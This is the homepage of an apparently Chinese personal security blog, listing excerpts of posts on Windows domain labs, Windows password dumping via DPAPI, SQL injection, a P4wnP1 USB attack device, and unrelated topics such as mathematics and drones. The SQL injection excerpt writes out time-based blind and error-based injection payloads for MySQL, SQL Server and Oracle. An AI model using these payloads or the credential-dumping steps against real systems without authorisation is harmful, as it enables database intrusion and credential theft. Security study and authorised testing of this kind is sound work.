<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ascotbe</title><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
<meta property="og:title" content="ascotbe">
<meta property="og:url" content="https://www.ascotbe.com/index.html">
<meta property="og:site_name" content="ascotbe">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.ascotbe.com/img/avatar.jpeg">
<meta property="article:author" content="ascotbe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.ascotbe.com/img/avatar.jpeg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ascotbe.com/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本篇文章距最近一次更新已过去","messageNext":"天，文章内容有可能过时."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: ascotbe","link":"链接: ","source":"来源: ascotbe","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ascotbe',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2022-12-13 14:30:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3133731_25dh7dx5bg4.css"><link rel="stylesheet" href="/css/beating_icon.css"><link rel="stylesheet" href="/css/mouse.css"><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="ascotbe" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> Contents</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> Archives</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> About</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://raw.staticdn.net/Ascotbe/Random-img/master/Blog/1.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ascotbe</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> Contents</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> Archives</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">ascotbe</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2021/12/01/WindowsStudyNotes/" title="Windows学习笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/134.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Windows学习笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/12/01/WindowsStudyNotes/" title="Windows学习笔记">Windows学习笔记</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-01T15:58:53.000Z" title="发表于 2021-12-01 23:58:53">2021-12-01</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/mimikatz/">mimikatz</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Windows/">Windows</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%9F%9F%E6%8E%A7%E6%90%AD%E5%BB%BA/">域控搭建</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%9F%9F%E5%86%85%E6%93%8D%E4%BD%9C/">域内操作</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A5%A8%E6%8D%AE/">票据</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A7%94%E6%B4%BE/">委派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A5%A8%E6%8D%AE/">虚拟机票据</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

不要问为什么没更新文章，在恶补英语所以没产出
之前关于红蓝对抗的文章是跟着其他文章学习的，现在看起来好乱，所以都删了改成这篇文章，主要还是记录自己的笔记，没有什么新技术

搭建域环境

环境清单

由于我们需要域环境模拟常规的内网，所以搭建域环境

Windows 2008 R2 X64
Windows 10
Windows 7 SP1 X64

Windows需要执行set-executionpolicy remotesigned来打开默认不允许执行ps脚本
配置静态IP
位置：网络和共享中心-&gt;本地连接-&gt;属性-&gt;IPV4
然后需要设置一个DNS指向本机，因为它后面是一个域控的角色，IP地址可以在详细信息里面看，最好和现在类似。

配置域环境
在服务管理器中添加角色

然后勾选这个，这边提一句在创建域的时候还需要把当前用户设置为强密码

然后就是无脑下一步安装，就可以安装成功了

接着我们点开角色 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/06/09/WindowsGrabPassword/" title="Windows本地密码抓取"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/127.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Windows本地密码抓取"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/06/09/WindowsGrabPassword/" title="Windows本地密码抓取">Windows本地密码抓取</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-06-09T15:45:42.000Z" title="发表于 2021-06-09 23:45:42">2021-06-09</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Windows/">Windows</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">系统密码抓取</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">浏览器密码抓取</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">数据库密码抓取</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/SSH%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">SSH密码抓取</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

学！后续会持续更新

系统密码
DPAPI解密
使用用户登录密码解密Master Key file，获得Master Key
固定位置： %APPDATA%\Microsoft\Protect\%SID%下往往有多个Master Key file
这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)
%APPDATA%\Microsoft\Protect\%SID%下存在一个固定文件Preferred，包含最后一个Master Key file的名称和创建时间，文件结构如下：
typedef struct _tagPreferredMasterKey&#123;  GUID guidMasterKey;  FILETIME ftCreated;&#125; PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;
完整的流程：

找到本机的Master Key ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/21/DatabaseHub/" title="数据库利用汇总"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/108.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="数据库利用汇总"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/21/DatabaseHub/" title="数据库利用汇总">数据库利用汇总</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-21T13:45:42.000Z" title="发表于 2020-07-21 21:45:42">2020-07-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

找笔记是在太烦人了，干脆全部写在一篇里面（来自1年半后的从写

随手测试语句
语句前面适当加入' 、&quot;、and等参数
#算个MD5extractvalue(1,concat(char(126),md5(1941797210)))#MySQL常用的盲注语句(CASE/**/WHEN/**/(2382=2382)/**/THEN/**/SLEEP(5)/**/ELSE/**/2382/**/END)    (select*from(select+sleep(4)union/**/select+1)a)#SQL Server常用的盲注语句/**/and(select+1)&gt;0waitfor/**/delay&#x27;0:0:4&#x27;/**/#Oracle常用的盲注语句/**/and/**/3=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;n&#x27;,2)#PostgreSQL常用 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/09/05/KnowledgeNavigationFile/" title="杂项知识汇总"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/43.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="杂项知识汇总"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/09/05/KnowledgeNavigationFile/" title="杂项知识汇总">杂项知识汇总</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-09-05T13:45:42.000Z" title="发表于 2019-09-05 21:45:42">2019-09-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XSS/">XSS</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

验证码相关
手机短信接码


国内平台
https://www.pdflibr.comhttps://www.visitorsms.com/cnhttps://www.becmd.comhttp://www.114sim.comhttps://yunduanxin.nethttp://www.smszk.comhttp://z-sms.comhttp://www.shejiinn.comhttps://sms.cngrok.com


国外平台
https://ch.freephonenum.comhttps://smsreceivefree.comhttps://zh.mytrashmobile.comhttps://www.receive-sms-online.infohttps://receiveasms.comhttps://sms-online.co/receive-free-smshttps://receive-sm ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/34.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux学习笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记">Linux学习笔记</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-12T15:58:53.000Z" title="发表于 2019-08-12 23:58:53">2019-08-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

于2020/3/18日重新排版修改
根目录解析


/ - 根目录
每一个文件和目录都从这里开始。
只有root用户具有该目录下的写权限。此目录和/root目录不同，/root目录是root用户的主目录。


/bin - 用户二进制文件
包含二进制可执行文件。
系统的所有用户使用的命令都设在这里，例如：ps，ls，ping，grep，cp等。


/sbin - 系统二进制文件
就像/bin，/sbin同样也包含二进制可执行文件。
但是，在这个目录下的linux命令通常由系统管理员使用，对系统进行维护。例如：iptables、reboot、fdisk、ifconfig、swapon命令。


/etc - 配置文件
包含所有程序所需的配置文件。
也包含了用于启动/停止单个程序的启动和关闭shell脚本。例如：/etc/resolv.conf、/etc/logrotate.conf


/dev - 设备文件
这些包括终端设备、 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/06/29/raspberry/" title="P4wnP1全家桶安装及实战"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/35.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="P4wnP1全家桶安装及实战"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/06/29/raspberry/" title="P4wnP1全家桶安装及实战">P4wnP1全家桶安装及实战</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-06-29T02:57:46.000Z" title="发表于 2019-06-29 10:57:46">2019-06-29</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.837Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/P4wnP1/">P4wnP1</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

今天想用自己USB入侵设备的时候，发现WIFI密码给忘了
重装的时候发现自己没有写详细过程！呸！！最后只能删了重写写过。


写在前头血的教训



树莓派没有那么容易坏不用买第二个！！


网上的wpa_supplicant.conf开启WIFI我试了N次都没成功过


USB转接头一定要买不需要焊接(别买Zero Quick Plug Bad USB


树莓派Zero W自带WIFI所以别再买WIFI模块了


装完P4wnP1切记重启不要直接拔掉会导致开不了机
sudo shutdown -r now



成品图

硬件需求

树莓派Zero W
USB接头
TF卡一张



通过网线连接树莓派



首先在config.txt最末行处换行添加如下代码，打开usb网卡模式
dtoverlay=dwc2


其次在cmdline.txt文件中找到rootwait字段，并在其后面空格添加如下信息，在打开系统时开启 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2018/12/05/HardwareRelatedKnowledge/" title="硬件相关知识"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/39.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="硬件相关知识"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/12/05/HardwareRelatedKnowledge/" title="硬件相关知识">硬件相关知识</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-12-05T12:02:59.000Z" title="发表于 2018-12-05 20:02:59">2018-12-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A1%AC%E4%BB%B6/">硬件</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/">内存结构</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

对两年前的知识进行了下温习，发现好多坑都填上了，然后把之前的文章删了总结到了一篇，到时候还有些点需要填上
Windows/Linux的内存结构
关于栈

两个系统的内容都差不多可以参考这篇文章：Linux栈溢出总结0x00
关于堆

暂时未有，等写到的时候添加
Windows的内存结构分布

首先是内存结构分布图，windows的内存默认是从0x80000000位置开始的

Linux的内存结构分布

首先先放个内存结构图，linux内存默认是从0xC0000000位置开始的

Windows/Linux的汇编区别
x86汇编一直存在两种不同的语法，在intel的官方文档中使用intel语法，Windows也使用intel语法，而UNIX平台的汇编器一直使用AT&amp;T语法。而linux是UNIX衍生的一种系统所有也是使用AT&amp;T语法。
相关区别：

AT&amp;T使用 $ 表示立即操作数，而Intel的 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/12/07/FurtherMathematics_0x01/" title="高等数学"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/154.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="高等数学"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/12/07/FurtherMathematics_0x01/" title="高等数学">高等数学</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-07T15:58:53.000Z" title="发表于 2022-12-07 23:58:53">2022-12-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-13T06:28:42.297Z" title="更新于 2022-12-13 14:28:42">2022-12-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
映射
定义：$ X 、 Y $ 非空集合, 法则  fff , 对  XXX 中每个元素  xxx  。唯一的 yyy  与之对应,  f:X→Yf: X \rightarrow Yf:X→Y
三要素： XXX 原像、fff 映射、RfR_{f}Rf​ 值域
x∈Xx \in Xx∈X对应的 yyy是唯一的 ,  Rf⊂YRf≠YR_{f} \subset Y R_{f} \neq YRf​⊂YRf​​=Y



名称
满足条件




满射
Rf=YR_{f} =  YRf​=Y


单射
$   x_{1} \neq x_{2}, f\left(x_{1}\right) \neq f\left(x_{2}\right)  $


一一映射
既是单射又是满射


逆映射
设 f:X→Yf: X \rightarrow Yf:X→Y 单射 , 每个  y∈Rfy \in R_{f}y∈Rf​  都有唯一的  $x \in X   $


复合映射
f[g(x)]f[g(x)]f[g(x)]



函数
函数的概念
定义：设数集$  D \subset \mathbf{R}$ , 则 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/10/24/FPV/" title="FPV笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/151.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="FPV笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/10/24/FPV/" title="FPV笔记">FPV笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-24T13:01:07.000Z" title="发表于 2022-10-24 21:01:07">2022-10-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/">无人机</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/">无人机配件</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

随便几张图的，一些选配笔记
穿越机的分类

按尺寸分类

进阶

构成图

飞塔
飞塔是由飞控和电调这两个部分组成的。其核心设备是飞控，全称为飞行控制器，顾名思义，飞控属于飞机的控制系统，你可以把它理解为飞机的大脑，控制着飞机的动力系统（电机、电调、电池、螺旋桨）和图像传输系统（摄像头、图传、接收设备）的正常运作。

电调的话有分四合一电调和分体电调。四合一电调的话是合在一个板块上的，方便焊接。而分体电调是有多个（主要看你又几个桨叶），一个电调控制一个桨叶

两层塔、三层塔有什么区别？
对于新手来说，直接选择飞塔可能会是一个比较省事儿的操作。因为一般来说，同一个厂牌的产品会有比较好的适配性和稳定性，装机的过程也会更加容易。由于机架的类型、空间的区别，飞塔通常会有两层塔和三层塔两种选择。
